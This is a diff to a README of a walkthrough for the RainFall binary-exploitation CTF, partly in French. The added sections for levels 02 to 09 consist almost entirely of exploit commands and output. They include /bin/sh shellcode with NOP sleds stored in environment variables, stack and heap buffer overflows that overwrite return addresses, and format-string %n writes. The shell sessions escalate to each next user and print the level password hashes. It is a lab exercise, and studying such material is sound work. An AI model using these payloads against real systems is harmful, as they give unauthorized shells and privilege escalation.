@@ -1,6 +1,6 @@
 # Rainfall
 
-## level0
+## level 00
 
 ```c
 
@@ -55,7 +55,7 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 level1@RainFall:~$ ls
 ```
 
-## level 1
+## level 01
 
 Ghidra :
 ```c
@@ -147,4 +147,116 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 ```
 On rajoute le cat pour maintenir le fd
 
+## level 02
+```bash
 
+export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+(gdb) x/s *((char**)environ)
+0xbffff4dd:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+
+(gdb) x/s *((char**)environ)
+0xbffff4dd:      "SHELLCODE=
+(gdb) quit
+
+level2@RainFall:~$ python -c 'print "A"*80 + "\x4b\x85\x04\x08" + "\x46\xf5\xff\xbf"' > /tmp/p
+level2@RainFall:~$ (cat /tmp/p;cat) | ./level2 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAKF���
+$ id
+uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+$ whoami
+level3
+$ 
+```
+## level 03
+```bash
+
+level3@RainFall:~$ (python -c 'import struct; print struct.pack("I", 0x804988c) + "%60c%4$n"';cat) | ./level3
+�                                                           
+Wait what?!
+ls
+ls: cannot open directory .: Permission denied
+id
+uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
+whoami
+level4
+cd ../level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+## level 04
+```bash
+python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
+
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+## level 05
+```bash
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' | ./level5
+
+id
+uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
+whoami 
+level6
+cd ../level6
+cat .passwd
+cat: .passwd: No such file or directory
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+## level 06
+```bash
+
+level6@RainFall:~$ ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+## level 07
+```bash
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+## level 08
+```bash
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth " " 
+0x804a008, (nil) 
+service ""
+0x804a008, 0x804a018 
+service "AAAA"
+0x804a008, 0x804a028 
+login
+$ id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+$ whoami 
+level9
+$ cat ../level9/.pass
+cat: ../level9/.pass: Permission denied
+$ cd ../level9
+$ \
+> 
+$ ls
+level9
+$ ls 0a
+ls: cannot access 0a: No such file or directory
+$ ls -a
+.  ..  .bash_logout  .bashrc  level9  .pass  .profile
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+## level09
+```bash
+
+level9@RainFall:~$ env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"')
+$ id
+uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
+$ whoami 
+bonus0
+$ cd ../bonus0  
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
